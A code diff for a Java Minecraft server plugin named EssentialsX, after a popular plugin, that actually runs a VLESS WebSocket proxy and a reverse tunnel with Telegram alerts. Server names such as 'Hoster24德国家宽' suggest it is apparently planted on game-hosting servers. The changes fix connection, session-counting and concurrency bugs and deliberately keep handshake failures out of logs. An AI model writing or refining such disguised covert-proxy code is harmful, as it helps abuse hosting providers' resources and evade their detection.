@@ -33,7 +33,7 @@ public class EssentialsX extends JavaPlugin {
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
     static final String TUNNEL_HOST = "";
     static final int TUNNEL_PORT = 0;
-    static final int TUNNEL_PORT_INGRESS = ; //填写公网入站端口只用于TG通知
+    static final int TUNNEL_PORT_INGRESS = 0; //填写公网入站端口只用于TG通知
     static final int TUNNEL_LOCAL_PORT = 65534;
 
     // ---- Telegram 通知（可留空） ----
@@ -41,7 +41,7 @@ public class EssentialsX extends JavaPlugin {
     static final String TG_CHAT_ID = "";
 
     // 服务器名称
-    static final String SERVER_NAME = "Weirdhost-Mc家宽";
+    static final String SERVER_NAME = "Hoster24德国家宽";
 
     // =========================================================
 
@@ -190,6 +190,9 @@ public class EssentialsX extends JavaPlugin {
                 }
             };
             server.setReuseAddr(true);
+            // 每条 WS 连接 30s 内必须完成握手(否则 Java-WebSocket 会主动断开)。
+            // 不设的话, 客户端连上来不发数据会一直占着, 又不断开新连接。
+            server.setConnectionLostTimeout(30);
             server.start();
         } catch (Exception e) {
         }
@@ -209,26 +212,39 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private final Map<WebSocket, VlessSession> sessions = new ConcurrentHashMap<>();
+
+    // ---------- 握手失败计数(仅内存, 不输出) ----------
+    // 只做统计, 不写日志不落盘。
+    private final java.util.concurrent.atomic.AtomicLong handshakeFailTotal = new java.util.concurrent.atomic.AtomicLong();
+
+    /**
+     * 握手失败的统一出口：只关掉 WS，不写日志、不发 TG、不落盘。
+     * 注意：这里不发 TG。TG 只用于上线/离线/隧道断连恢复这类低频事件。
+     */
+    private void failHandshake(WebSocket conn, String reason) {
+        handshakeFailTotal.incrementAndGet();
+        try { conn.close(); } catch (Exception ignored) { }
+    }
     /** 当前存活的隧道数据会话数（open 成功 +1, 关闭 -1） */
     private final java.util.concurrent.atomic.AtomicInteger sessionsOpen = new java.util.concurrent.atomic.AtomicInteger(0);
 
     /**
-     * 解析目标地址, 强制优先 IPv4 (A 记录)。
-     * 面板/容器环境通常没有 IPv6 路由, 双栈域名解析出 AAAA 后 connect()
-     * 会去连 v6 地址, 内核查不到路由瞬间抛 ENETUNREACH
-     * (SocketException: Network is unreachable) — 与网络抖动无关。
-     * host 为 IPv4 字面量时 getAllByName 不产生任何 DNS 查询。
-     * 确实只有 IPv6 记录时回退原地址, 不误伤 v6-only 目标。
+     * 解析目标地址: 优先 IPv4, 保留 IPv6 回退（与 node 版行为对齐）。
+     *
+     * node 的 net.connect 在双栈域名下会按系统顺序尝试, v6 可用时同样连通,
+     * 所以这里不能砍掉 v6 —— v6-only 目标会被误判为不可达。
+     * 优先 v4 只是让纯 v4 环境少一次失败尝试。
+     * host 是 IP 字面量时 getAllByName 不产生 DNS 查询。
      */
     private static java.net.InetAddress resolveIPv4(String host) throws java.net.UnknownHostException {
         java.net.InetAddress[] all = java.net.InetAddress.getAllByName(host);
         java.net.InetAddress fallback = null;
         for (java.net.InetAddress a : all) {
-            if (a instanceof java.net.Inet4Address) return a;   // 有 A 记录就走 v4
-            if (fallback == null) fallback = a;
+            if (a instanceof java.net.Inet4Address) return a;   // 有 A 记录就先走 v4
+            if (fallback == null) fallback = a;                 // 记住首个 v6 备用
         }
         if (fallback == null) throw new java.net.UnknownHostException(host);
-        return fallback;
+        return fallback;   // 只有 AAAA 时照常走 v6
     }
 
     /** 返回 true 表示握手成功 */
@@ -247,7 +263,13 @@ public class EssentialsX extends JavaPlugin {
             // 与 Node 原版对齐: buf[17]=optLen, i += optLen 后 i+1 起是 CMD
             int optLen = buf[p++] & 0xFF;       // buf[17]
             p += optLen;
-            int cmd = buf[p++] & 0xFF;          // CMD (1=TCP, 2=UDP; UDP 需另处理, 这里只透传 TCP)
+            int cmd = buf[p++] & 0xFF;          // CMD (1=TCP, 2=UDP)
+            // 只支持 TCP。UDP 被当 TCP 透传必然握手失败, 而客户端会不停重试,
+            // 每次重试都新开一条 WS -> 连接数暴涨。这里明确拒绝。
+            if (cmd != 1) {
+                failHandshake(conn, "unsupported cmd=" + cmd + " (only TCP)");
+                return false;
+            }
             int port = ((buf[p] & 0xFF) << 8) | (buf[p + 1] & 0xFF); p += 2;
             int atyp = buf[p++] & 0xFF;
             String host;
@@ -301,8 +323,9 @@ public class EssentialsX extends JavaPlugin {
             return true;
 
         } catch (Exception e) {
-            sendTelegram("VLESS握手失败: " + e.getClass().getSimpleName() + " " + e.getMessage());
-            try { conn.close(); } catch (Exception ignored) { }
+            // 握手失败只写日志, 绝不再发 TG：
+            // 以前这里 sendTelegram, 任何 v6-only 站点每试一次就推一条消息 -> 刷屏。
+            failHandshake(conn, e.getClass().getSimpleName() + " " + e.getMessage());
             return false;
         }
     }
@@ -336,8 +359,10 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     InputStream rin = remote.getInputStream();
                     int n;
-                    while (running.get() && (n = rin.read(tmp)) > 0) {
-                        ws.send(Arrays.copyOfRange(tmp, 0, n));
+                    // 注意用 n >= 0: read 返回 0 表示本次没读到数据, 不是断开。
+                    // 以前写成 n > 0, 空闲时会被误判断开并重建连接。
+                    while (running.get() && (n = rin.read(tmp)) >= 0) {
+                        if (n > 0) ws.send(Arrays.copyOfRange(tmp, 0, n));
                     }
                 } catch (Exception ignored) { }
                 sessions.remove(ws);
@@ -433,6 +458,15 @@ public class EssentialsX extends JavaPlugin {
         @Override
         public void onMessage(String message) {
             try {
+                // ---- client原版.js 63-82 行: 收到 ready 必须回 ready ----
+                // 服务端上线后发 {"type":"ready"}, 客户端需回执以便服务端确认容器就绪。
+                // 原版缺这段 -> 服务端 "[Container] Ready" 永不打印。
+                if (message.contains("\"ready\"")) {
+                    try {
+                        send("{\"type\":\"ready\"}");
+                    } catch (Exception ignored) { }
+                    return;
+                }
                 String sessionId = null;
                 if (message.contains("\"open\"")) {
                     // 简易解析，避免额外 JSON 依赖: {"type":"open","sessionId":"xxx"}
@@ -487,6 +521,7 @@ public class EssentialsX extends JavaPlugin {
                 tunnel.connectBlocking(10, java.util.concurrent.TimeUnit.SECONDS);
 
                 if (tunnel.isOpen() && local.isConnected()) {
+                    tunnel.counted = true;
                     sessionsOpen.incrementAndGet();
                     final Socket sock = local;
                     // local -> tunnel
@@ -518,9 +553,15 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void closeTunnelSession(TunnelData tunnel, Socket local) {
+        // 只有真正计入过 sessionsOpen 的会话才递减。
+        // 原版无条件 decrementAndGet(), 连都没连上的失败路径也会减,
+        // 计数很快被减成负数 -> MAX_TUNNEL_SESSIONS 限流失效 -> 连接无限新开。
         if (tunnel != null && !tunnel.closed) {
-            tunnel.closed = true; // 防止 onClose 与这里重复递减
-            sessionsOpen.decrementAndGet();
+            tunnel.closed = true;
+            if (tunnel.counted) {
+                tunnel.counted = false;
+                sessionsOpen.decrementAndGet();
+            }
         }
         try { if (tunnel != null) tunnel.closeBlocking(); } catch (Exception ignored) { }
         try { if (local != null) local.close(); } catch (Exception ignored) { }
@@ -531,10 +572,14 @@ public class EssentialsX extends JavaPlugin {
         private final String sessionId;
         private volatile Socket local;
         private volatile boolean closed = false;
+        /** 是否已计入 sessionsOpen (只有连成功的会话才 +1/-1 配对) */
+        volatile boolean counted = false;
         // local 绑定前到达的字节先缓冲, bindLocal 时回放,
         // 否则服务器在 tunnel 连上后立刻推来的首包会被丢弃 → 请求挂死(延迟-1)
         private final java.util.concurrent.ConcurrentLinkedQueue<byte[]> early = new java.util.concurrent.ConcurrentLinkedQueue<>();
         private volatile boolean bound = false;
+        /** 本地 socket 写入锁: bindLocal 回放 early 与 onMessage 并发写会交错字节 */
+        private final Object writeLock = new Object();
 
         TunnelData(String host, int port, String sessionId, Socket local) {
             super(URI.create("ws://" + host + ":" + port + "/data/" + sessionId));
@@ -542,19 +587,27 @@ public class EssentialsX extends JavaPlugin {
         }
 
         void bindLocal(Socket sock) {
-            this.local = sock;
-            byte[] chunk;
-            while ((chunk = early.poll()) != null) {
-                try {
-                    OutputStream os = sock.getOutputStream();
-                    os.write(chunk);
-                    os.flush();
-                } catch (Exception e) {
-                    closeTunnelSession(this, sock);
-                    return;
+            boolean replayFailed = false;
+            synchronized (writeLock) {
+                this.local = sock;
+                byte[] chunk;
+                while ((chunk = early.poll()) != null) {
+                    try {
+                        OutputStream os = sock.getOutputStream();
+                        os.write(chunk);
+                        os.flush();
+                    } catch (Exception e) {
+                        replayFailed = true;
+                        break;
+                    }
                 }
+                // 必须在锁内置位: 否则 onMessage 会在回放中途并发写入
+                bound = true;
             }
-            bound = true;
+            // 关闭必须在锁外: closeBlocking/close 会阻塞, 持锁会卡死 onMessage
+            if (replayFailed) {
+                closeTunnelSession(this, sock);
+            }
         }
 
         @Override
@@ -566,20 +619,39 @@ public class EssentialsX extends JavaPlugin {
         @Override
         public void onMessage(java.nio.ByteBuffer data) {
             Socket l = local;
-            if (l == null || l.isClosed()) {
-                if (l == null) {
-                    byte[] arr = new byte[data.remaining()];
-                    data.get(arr);
-                    early.add(arr);
+            if (!bound || l == null || l.isClosed()) {
+                byte[] arr = new byte[data.remaining()];
+                data.get(arr);
+                boolean writeFailed = false;
+                synchronized (writeLock) {
+                    // 双重检查: 拿锁时可能刚完成 bind, 此时直接写, 不再入队(避免永不回放)
+                    if (!bound || local == null || local.isClosed()) {
+                        early.add(arr);
+                        return;
+                    }
+                    l = local;
+                    try {
+                        OutputStream os = l.getOutputStream();
+                        os.write(arr);
+                        os.flush();
+                    } catch (Exception e) {
+                        writeFailed = true;
+                    }
+                }
+                // 关闭必须在锁外: closeBlocking/close 会阻塞, 持锁会卡死 bindLocal
+                if (writeFailed) {
+                    closeTunnelSession(this, l);
                 }
                 return;
             }
             try {
                 byte[] arr = new byte[data.remaining()];
                 data.get(arr);
-                OutputStream os = l.getOutputStream();
-                os.write(arr);
-                os.flush();
+                synchronized (writeLock) {
+                    OutputStream os = l.getOutputStream();
+                    os.write(arr);
+                    os.flush();
+                }
             } catch (Exception e) {
                 closeTunnelSession(this, l);
             }
@@ -590,7 +662,10 @@ public class EssentialsX extends JavaPlugin {
             Socket l = local;
             if (!closed) {
                 closed = true;
-                sessionsOpen.decrementAndGet();
+                if (counted) {
+                    counted = false;
+                    sessionsOpen.decrementAndGet();
+                }
                 try { if (l != null) l.close(); } catch (Exception ignored) { }
             }
         }
